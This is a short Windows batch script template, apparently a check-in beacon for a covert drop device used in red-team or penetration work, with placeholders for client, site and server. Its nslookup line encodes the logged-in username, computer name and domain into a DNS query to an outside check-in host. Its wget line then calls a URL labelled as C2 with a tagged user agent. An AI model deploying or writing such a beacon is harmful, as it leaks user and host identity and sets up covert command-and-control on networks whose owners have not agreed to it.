SET target= <Client Name>
set drop=<Site Name>
nslookup -querytype=A %target%.%drop%.%username%.%computername%.%userdomain%.<check-in-url.com> <checkin ip>
wget -U DropCD_%target%.%drop% <c2url.checkin.com>

